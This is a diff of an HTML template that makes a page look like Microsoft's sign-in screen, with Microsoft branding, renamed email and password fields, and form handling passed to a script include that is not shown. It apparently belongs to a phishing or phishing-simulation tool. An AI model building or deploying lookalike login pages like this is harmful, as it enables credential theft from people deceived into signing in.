@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <title></title>
+    <title>Sign in to your account</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="icon" type="image/x-icon" href="/static/images/microsoft.ico">
+    <link rel="icon" type="image/x-icon" href="{{.static}}/images/microsoft.ico">
   </head>
   <body>
     <main>
-      <div>
-        <img class="microsoft" src="/static/images/microsoft.svg">
+      <form action="javascript:void(0);" id="PF_form">
+        <img class="microsoft" src="{{.static}}/images/microsoft.svg">
         <h3>Sign in</h3>
-        <input id="user" type="text" placeholder="Email, phone, or Skype">
-        <input id="pass" type="password" placeholder="Password">
+        <input id="PF_user" type="text" placeholder="Email, phone, or Skype" required>
+        <input id="PF_pass" type="password" placeholder="Password" required>
         <label class="noacc">No account? <a href="https://signup.live.com/signup">Create one!</a></label>
-        <button id="submit">Sign in</button>
-      </div>
+        <button type="submit">Sign in</button>
+      </form>
     </main>
-    <script type="module" src="/static/script.js"></script>
+    {{template "parts/script" .}}
   </body>
   <style>
     *{
@@ -27,7 +27,7 @@
     }
 
     body{
-      background: url("/static/images/microsoftbg.svg")
+      background: url("{{.static}}/images/microsoft_bg.svg")
     }
 
     main{
@@ -42,7 +42,7 @@
       width: 400px;
     }
 
-    div{
+    form{
       display: flex;
       flex-direction: column;
       padding: 50px;
@@ -105,6 +105,5 @@
       color: gray;
       text-decoration: underline;
     }
-
   </style>
 </html>
